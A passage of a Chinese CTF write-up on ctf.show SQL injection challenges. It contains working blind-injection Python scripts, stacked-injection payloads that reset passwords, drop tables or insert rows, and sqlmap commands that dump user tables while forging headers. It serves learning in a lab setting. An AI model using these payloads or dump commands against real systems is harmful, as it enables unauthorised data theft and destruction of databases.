<p>在 SQL 查询中，字符串比较默认是 <strong>不区分大小写</strong> 的。所以这里好像需要转小写</p>
<p>因为是二分法，<code>_</code>的ascii字符是<code>95</code>，很容易被跳过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b3cfa897-d763-4f0e-81e8-323a934700e7.challenge.ctf.show/api/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;admin&#x27; and if(substr(database(),&#123;i&#125;,1)&gt;chr(&#123;mid&#125;),1,0)#&quot;</span></span><br><span class="line">        <span class="comment">#payload =  f&quot;admin&#x27; and if(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1)&gt;chr(&#123;mid&#125;),1,0)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;admin&#x27; and if(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;i&#125;,1)&gt;chr(&#123;mid&#125;),1,0)#&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if(substr((select f1ag from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1)&gt;chr(<span class="subst">&#123;mid&#125;</span>),1,0)#&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span> : payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> : <span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag.lower())</span><br></pre></td></tr></table></figure>

<p>可以使用 <code>BINARY</code> 关键字强制区分大小写或者手动改一下</p>
<p>如果硬要识别出来就要写遍历了，但是那样子不够快</p>
<h3 id="web193-194"><a href="#web193-194" class="headerlink" title="web193&amp;194"></a>web193&amp;194</h3><p>这里过滤了substr，也是有代替函数的，当然也可以用like和通配符去匹配</p>
<p>like+通配符</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://cf1fb41b-240d-4778-8ae7-c9442519fb32.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789-,&#123;&#125;_&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    sign = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27; and (select database()) like &#x27;&#123;&#125;&#x27;#&quot;.format(flag+j+&#x27;%&#x27;)</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27; and (select group_concat(table_name)from information_schema.tables where table_schema=database()) like &#x27;&#123;&#125;&#x27;#&quot;.format(flag+j+&#x27;%&#x27;)</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27; and (select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;) like &#x27;&#123;&#125;&#x27;#&quot;.format(flag+j+&#x27;%&#x27;)</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27; and (select f1ag from ctfshow_flxg) like &#x27;&#123;&#125;&#x27;#&quot;</span>.<span class="built_in">format</span>(flag+j+<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            sign = <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> sign == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>替换函数mid</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://cf1fb41b-240d-4778-8ae7-c9442519fb32.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789-,&#123;&#125;_&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    sign = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if(mid(database(),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;,1,0)#&quot;</span></span><br><span class="line">        <span class="comment">#其他的payload就自己改吧</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            sign = <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> sign == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>替换函数left</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://efe36a06-d5e8-4069-a729-598ea9a984e8.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789-,&#123;&#125;_&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    sign = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        payload = <span class="string">&quot;admin&#x27; and if(left(database(),&#123;0&#125;)=&#x27;&#123;1&#125;&#x27;,1,0)#&quot;</span>.<span class="built_in">format</span>(i,flag+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            sign = <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> sign == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>方法还是很多的</p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h3><p>还是得登录成功才有flag</p>
<p>直接分号执行多条语句，更新ctfshow_user用户的密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;update`ctfshow_user`set`pass`=1</span><br></pre></td></tr></table></figure>

<h3 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h3><p>这里限制了username的长度，刚刚的payload肯定是超过了</p>
<p>这道题目的select虽然写的是被过滤了，但是实际并没有被过滤。</p>
<p>非预期：</p>
<p>判断条件满足的设定是$row[0]&#x3D;&#x3D;$password，row 存储的是结果集中的一行数据，row[0]就是这一行的第一个数据。既然可以堆叠注</p>
<p>入，就是可以多语句查询，$row应该也会逐一循环获取每个结果集。</p>
<p>那么可以输入username为1;select(1)，password为1。执行 <code>SELECT(1);</code> 后，数据库会返回一个结果集，其中包含一行一列，值为 <code>1</code>。当row 获取到第二个查询语句 select(1) 的结果集时，即可获得row[0]&#x3D;1，那么password输入1就可以满足条件判断。同样输入其他密码也可以</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250504161903240.png" alt="image-20250504161903240"></p>
<p>官方解：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=0(用弱比较去匹配用户名)</span><br><span class="line">password=passwordAUTO(之前泄露的原始密码)</span><br></pre></td></tr></table></figure>

<h3 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h3><p>过滤了select，但是没有长度限制，那我们可以对表进行一些操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=0;drop table ctfshow_user; create table ctfshow_user(`username` varchar(255),`pass` varchar(255)); insert ctfshow_user(`username`,`pass`) values(1,2)</span><br><span class="line">password随便填，不影响</span><br></pre></td></tr></table></figure>

<p>这里直接删掉之前的表去创建新的表，然后插入数据就行</p>
<p>或者可以用alter</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;alter table ctfshow_user drop pass;alter table ctfshow_user add pass int default 1</span><br></pre></td></tr></table></figure>

<h3 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h3><p>不能用drop，create，set的话，直接插入数据就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=0;insert ctfshow_user(`username`,`pass`) value(1,2)</span><br><span class="line">password随便设置</span><br></pre></td></tr></table></figure>

<p>然后传1&#x2F;2去登录就行</p>
<h3 id="web199-200"><a href="#web199-200" class="headerlink" title="web199&amp;200"></a>web199&amp;200</h3><p>过滤了括号，前面的方法走不通</p>
<p>利用<code>show</code>。根据题目给的查询语句，可以知道数据库的表名为ctfshow_user，那么可以通过<code>show tables</code>，获取表名的结果集，在这个结果集里定然有一行的数据为ctfshow_user。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=0;show tables</span><br><span class="line">password=ctfshow_user</span><br></pre></td></tr></table></figure>

<p>这么看来的话好像前面几个题都可以这么做</p>
<p>不太想做sqlmap的，先不写</p>
<h2 id="练习sqlmap"><a href="#练习sqlmap" class="headerlink" title="练习sqlmap"></a>练习sqlmap</h2><p>好吧还是不太想写，把做的搬过来了</p>
<h3 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h3><p>#设置UA头和referer头</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241214112743785-1747825292263-7.png" alt="image-20241214112743785"></p>
<p>这里的话是需要我们学习sqlmap 的语法和使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用--user-agent 指定agent</span><br><span class="line"> --user-agent=sqlmap </span><br><span class="line"> 使用--referer 绕过referer检查</span><br><span class="line"> --referer=&quot;ctf.show&quot;</span><br></pre></td></tr></table></figure>

<p>我们先拿第一题来具体学习一下注入过程和sqlmap的使用顺序</p>
<p>注入过程</p>
<ul>
<li>判断是否存在sql注入漏洞</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u http://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show/api/?id=1 –user-agent sqlmap –referer https://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show:8080/sqlmap.php</span><br></pre></td></tr></table></figure>

<p>然后我们来分析一下测试过程的一些询问和内容</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250112233312524-1747825292263-9.png" alt="image-20250112233312524"></p>
<p>我们分析里面主要的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[23:23:58] [INFO] GET parameter &#x27;id&#x27; appears to be &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27; injectable</span><br><span class="line">GET 参数 &#x27;id&#x27; 被判断为可注入，且具体注入方式为基于布尔值的盲注。</span><br><span class="line">[23:23:58] [INFO] heuristic (extended) test shows that the back-end DBMS could be &#x27;MySQL&#x27;</span><br><span class="line">扩展的启发式测试表明，后端数据库管理系统（DBMS）可能是 MySQL。</span><br><span class="line">it looks like the back-end DBMS is &#x27;MySQL&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] y</span><br><span class="line">似乎后端数据库管理系统是 MySQL。您是否希望跳过适用于其他数据库管理系统的测试有效载荷？输入 [Y/n] 表示选择是或否。选择 &#x27;y&#x27; 表示跳过。</span><br><span class="line">for the remaining tests, do you want to include all tests for &#x27;MySQL&#x27; extending provided level (1) and risk (1) values? [Y/n] y</span><br><span class="line">对于剩余的测试，您是否希望包括所有针对 MySQL 的测试，并扩展预设的等级（1）和风险（1）值？输入 [Y/n] 表示选择是或否。选择 &#x27;y&#x27; 表示包含所有测试。</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250112235302885-1747825292263-11.png" alt="image-20250112235302885"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET parameter &#x27;id&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y</span><br><span class="line">GET 参数 &#x27;id&#x27; 存在漏洞。您是否希望继续测试其他参数（如果有的话）？输入 [y/N] 表示选择是或否。选择 &#x27;y&#x27; 意味着继续进行其他参数的测试。</span><br></pre></td></tr></table></figure>

<p>这里的话其实就是和英语翻译是一样的，理解了每句话的意思然后做出需要的选择，就可以了</p>
<ul>
<li>获取所有数据库名字</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u http://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show/api/?id=1 –dbs –user-agent sqlmap –referer https://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show:8080/sqlmap.php</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250112235658378-1747825292263-13.png" alt="image-20250112235658378"></p>
<p>找到数据库名了，显然第一个就是我们需要的数据库</p>
<ul>
<li>获取当前数据库名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u http://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show/api/?id=1 –current-db –user-agent sqlmap –referer https://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show:8080/sqlmap.php</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250112235847883-1747825292263-15.png" alt="image-20250112235847883"></p>
<p>和我们想的是一样的</p>
<ul>
<li>获取数据库下的数据表</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u http://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show/api/?id=1 -D ctfshow_web –tables –user-agent sqlmap –referer https://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show:8080/sqlmap.php</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113000020342-1747825292263-17.png" alt="image-20250113000020342"></p>
<ul>
<li>获取表下的列名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u http://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show/api/?id=1 -D ctfshow_web -T ctfshow_user –columns –user-agent sqlmap –referer https://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show:8080/sqlmap.php</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113000113447-1747825292263-19.png" alt="image-20250113000113447"></p>
<ul>
<li>导出数据</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u http://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show/api/?id=1 -D ctfshow_web -T ctfshow_user -C pass –dump –user-agent sqlmap –referer https://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show:8080/sqlmap.php</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113000247615-1747825292263-21.png" alt="image-20250113000247615"></p>
<p>然后就拿到我们的flag了</p>
<p>sqlmap基于GET传参的注入</p>
<p>1.测试注入点以及是否存在注入</p>
<p>python3 sqlmap.py -u [url+参数]</p>
<p>2.爆出所有数据库</p>
<p>pyhton3 sqlmap.py -u [url+参数] –dbs</p>
<p>3.爆出当前使用的数据库</p>
<p>python3 sqlmap.py -u [url+参数] –current-db</p>
<p>4.爆出当前数据库下的表名</p>
<p>python3 sqlmap.py -u [url+参数] -D [数据库名] –tables</p>
<p>5.爆出所有表的字段名</p>
<p>python3 sqlmap.py -u [url+参数] -D [数据库名] -T [表名] –columns</p>
<p>6.爆出字段中的数据</p>
<p>python3 sqlmap.py -u [url+参数] -D [数据库名] -T [表名] -C [字段名] –dump</p>
<p>关于UA头的设置和referer的设置</p>
<p>–user-agent sqlmap</p>
<ul>
<li><code>User-Agent</code> 头通常由浏览器或其他客户端软件发送，用于标识请求的来源设备和软件,通过设置 <code>--user-agent</code>，可以模拟特定的浏览器或客户端类型,某些网站可能会阻止来自已知爬虫或自动化工具（如 sqlmap）的请求。通过伪造 <code>User-Agent</code>，可以绕过这些安全检查</li>
</ul>
<p>–referer <a target="_blank" rel="noopener" href="https://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show:8080/sqlmap.php">https://8b0e6f9f-0bc1-499f-b9f5-30a3d1b6d4c2.challenge.ctf.show:8080/sqlmap.php</a></p>
<ul>
<li>伪造 <code>Referer</code> 头可以用于模拟来自特定页面或来源的请求，一些网站可能会检查 <code>Referer</code> 头，以确保请求来源于允许的页面。如果没有合适的 <code>Referer</code>，网站可能会拒绝请求或返回不同的内容。伪造 <code>Referer</code> 头可以帮助绕过这些安全机制。通过设置特定的 <code>Referer</code> 头，攻击者可以让目标网站认为请求是来自合法用户的正常操作。这有助于隐藏攻击行为。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line">--user-agent sqlmap --referer ctf.show这样也是可以的，只要来源是ctf.show就可以了</span><br></pre></td></tr></table></figure>

<h3 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h3><p>#–data参数</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113002031251-1747825292263-23.png" alt="image-20250113002031251"></p>
<p>POST注入的方式</p>
<p> sqlmap.py -r 请求包text文件 -p 指定的参数 –tables<br>​ sqlmap.py -u url –forms 自动判断注入<br>​ sqlmap.py -u url –data&#x3D;”指定参数”</p>
<p>–data&#x3D;DATA 通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。</p>
<p>直接给payload了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">python3 sqlmap.py -u http://fd2e4296-abd1-4a84-b9c1-c24262dea2a6.challenge.ctf.show/api/ --data=&quot;id=1&quot; --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user -C pass --dump</span><br></pre></td></tr></table></figure>

<h3 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h3><p>#–method参数</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113105708883-1747825292263-25.png" alt="image-20250113105708883"></p>
<p>–method&#x3D;”xxx” 强制使用给定的HTTP方法(例如：PUT)</p>
<p>使用–method&#x3D;”PUT”时，需要加上 –headers&#x3D;”Content-Type: text&#x2F;plain” 否则是按表单提交的，put接收不到</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">python3 sqlmap.py -u http://86ffe7af-f118-4848-8a4c-09b410298b56.challenge.ctf.show:8080/api/index.php --method=&quot;put&quot; --user-agent sqlmap --referer ctf.show --headers=&quot;Content-Type: text/plain&quot; --data=&quot;id=1&quot; -D ctfshow_web -T ctfshow_user -C pass --dump</span><br></pre></td></tr></table></figure>

<h3 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h3><p>#–cookie参数</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113114452584-1747825292263-27.png" alt="image-20250113114452584"></p>
<p>设置cookie可以通过后台对cookie的验证</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113132653389-1747825292263-29.png" alt="image-20250113132653389">sqlmap.php文件中响应标头中的set-cookie和请求标头中的PHPSESSID都需要客户端在下一次请求时发送给服务端</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">python3 sqlmap.py -u http://62ab32f3-d46b-4b44-a4b8-fea51589800d.challenge.ctf.show/api/index.php --method=&quot;put&quot; --data=&quot;id=1&quot; --user-agent sqlmap --referer ctf.show -headers=&quot;content-type:text/plain&quot; --cookie=&quot;PHPSESSID=je3ssbqgn68psi3q1qa6fjcmbc;ctfshow=cc417a7da6909d583d4e0846fd9d4c5f&quot; -D ctfshow_web -T ctfshow_user -C id,pass,username --dump</span><br></pre></td></tr></table></figure>

<p>sqlmap 将使用这个 Cookie 进行请求。</p>
<h3 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h3><p>#–safe安全设置</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113133845367-1747825292263-31.png" alt="image-20250113133845367"></p>
<p>抓包发现在请求index.php之前还会请求一次getToken.php</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113135156243-1747825292263-33.png" alt="image-20250113135156243"></p>
<p>所以我们–safe-url 参数设置在测试目标地址前访问的安全链接，将 url 设置为 api&#x2F;getToken.php，再加上 –safe-preq&#x3D;1 表示访问 api&#x2F;getToken.php 一次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">--safe-url=SAFEURL  提供一个安全不错误的连接，每隔一段时间都会去访问一下</span><br><span class="line"></span><br><span class="line">--safe-post=SAFE..  提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。</span><br><span class="line"></span><br><span class="line">--safe-req=SAFER..  从文件中加载安全HTTP请求</span><br><span class="line"></span><br><span class="line">--safe-freq=SAFE..  测试一个给定安全网址的两个访问请求</span><br></pre></td></tr></table></figure>

<p><code>--safe-url=SAFEURL</code> 参数用于指定一个安全的 URL</p>
<p>主要功能</p>
<ol>
